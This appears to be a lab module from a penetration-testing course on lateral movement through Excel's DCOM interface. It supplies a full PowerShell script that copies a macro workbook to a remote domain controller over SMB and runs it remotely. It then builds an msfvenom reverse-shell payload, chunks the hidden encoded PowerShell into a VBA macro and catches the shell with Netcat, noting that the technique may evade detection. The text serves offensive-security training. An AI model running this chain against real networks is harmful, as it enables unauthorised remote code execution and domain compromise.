In this section we will take a closer look at a fairly new lateral movement technique that exploits the _Distributed Component Object Model_ ( _DCOM_ ).

The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

Both COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook as well as PowerPoint. Since this requires the presence of Microsoft Office on the target computer, this lateral movement technique is best leveraged against workstations. However, in our case, we will demonstrate this attack in the lab against the dedicated domain controller on which Office is already installed. Specifically, we will leverage the _Excel.Application_ DCOM object.

To begin, we must first discover the available methods or sub-objects for this DCOM object using PowerShell. For this example, we are operating from the Windows 10 client as the jeff_admin user, a local admin on the remote machine.

In this sample code, we first create an instance of the object using PowerShell and the _CreateInstance_ method of the _System.Activator_ class.

As an argument to _CreateInstance_, we must provide its type by using the _GetTypeFromProgID_ method, specifying the program identifier (which in this case is _Excel.Application_), along with the IP address of the remote workstation.

With the object instantiated, we can discover its available methods and objects using the _Get-Member_ cmdlet.

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$com | Get-Member
```

This script produces the following truncated output:

```
         TypeName: System.__ComObject#{000208d5-0000-0000-c000-000000000046}
Name                    MemberType     Definition                                                                                                                      
----                    ----------     ----------                                                                                                                      
ActivateMicrosoftApp    Method         void ActivateMicrosoftApp (XlMSApplication)                                                                                     
AddChartAutoFormat      Method         void AddChartAutoFormat (Variant, string, Varia  
...
ResetTipWizard          Method         void ResetTipWizard ()
Run                     Method         Variant Run (Variant...
Save                    Method         void Save (Variant)
...
Workbooks               Property       Workbooks Workbooks () {get} 
...
```

The output contains many methods and objects but we will focus on the _Run_ method, which will allow us to execute a Visual Basic for Applications (VBA) macro remotely.

To use this, we'll first create an Excel document with a proof of concept macro by selecting the _VIEW_ ribbon and clicking _Macros_ from within Excel.

In this simple proof of concept, we will use a VBA macro that launches notepad.exe:

```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```

We have named the macro "mymacro" and saved the Excel file in the legacy .xls format.

To execute the macro, we must first copy the Excel document to the remote computer. Since we must be a local administrator to take advantage of DCOM, we should also have access to the remote filesystem through SMB.

We can use the _Copy_ method of the .NET _System.IO.File_ class to copy the file. To invoke it, we specify the source file, destination file, and a flag to indicate whether the destination file should be overwritten if present, as shown in the PowerShell code below:

```
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

Before we are able to execute the _Run_ method on the macro, we must first specify the Excel document it is contained in. This is done through the _Open_ method of the _Workbooks_ object, which is also available through DCOM as shown in the enumeration of methods and objects:

```
         TypeName: System.__ComObject#{000208d5-0000-0000-c000-000000000046}
Name                   MemberType Definition                                                                                                                      
----                   ---------- ----------                                                                                                                      
ActivateMicrosoftApp   Method     void ActivateMicrosoftApp (XlMSApplication)                                                                                     
AddChartAutoFormat     Method     void AddChartAutoFormat (Variant, string, Variant)  
...
ResetTipWizard         Method     void ResetTipWizard ()
Run                    Method     Variant Run (Variant...
Save                   Method     void Save (Variant)
...
Workbooks              Property   Workbooks Workbooks () {get} 
...
```

The _Workbooks_ object is created from the _$com_ COM handle we created earlier to perform our enumeration.

We can call the _Open_ method directly with code like this:

```
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
```

However, this code results in an error when interacting with the remote computer:

```
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
Unable to get the Open property of the Workbooks class
At line:1 char:1
+ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (:) [], COMException
    + FullyQualifiedErrorId : System.Runtime.InteropServices.COMException
```

The reason for this error is that when _Excel.Application_ is instantiated through DCOM, it is done with the SYSTEM account. The SYSTEM account does not have a profile, which is used as part of the opening process. To fix this problem, we can simply create the Desktop folder at C:\\Windows\\SysWOW64\\config\\systemprofile, which satisfies this profile requirement.

We can create this directory with the following PowerShell code:

```
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
```

With the profile folder for the SYSTEM account created, we can attempt to call the _Open_ method again, which now should succeed and open the Excel document.

Now that the document is open, we can call the _Run_ method with the following complete PowerShell script:

```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```

This code should open the Notepad application as a background process executing in a high integrity context on the remote machine as illustrated below

![Figure 6: Notepad is launched from Excel](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/ad/7a8e083982667c6bdf201b0cc951fe38-ad07.png)

While creating a remote Notepad application is interesting, we need to upgrade this attack to launch a reverse shell instead. Since we are using an Office document, we can simply reuse the Microsoft Word client side code execution technique that we covered in a previous module.

To do this, we'll use msfvenom to create a payload for an HTA attack since it contains the Base64 encoded payload to be used with PowerShell:

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6461 bytes
Saved as: evil.hta
```

Notice that we use the IP address of the Windows 10 client's second network interface so that the domain controller can call back to our Netcat listener.

Next, we extract the line starting with "powershell.exe -nop -w hidden -e" followed by the Base64 encoded payload and use the simple Python script in Listing 60 to split the command into smaller chunks, bypassing the size limit on literal strings in Excel macros:

```
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

Now we'll update our Excel macro to execute PowerShell instead of Notepad and repeat the actions to upload it to the domain controller and execute it.

```
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
```

Before executing the macro, we'll start a Netcat listener on the Windows 10 client to accept the reverse command shell from the domain controller:

```
PS C:\Tools\practical_tools> nc.exe -lvnp 4444

listening on [any] 4444 ...
connect to [192.168.1.111] from (UNKNOWN) [192.168.1.110] 59121
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

While the attack requires access to both TCP 135 for DCOM and TCP 445 for SMB, this is a relatively new vector for lateral movement and may avoid some detection systems such as Network Intrusion Detection or host-based antivirus.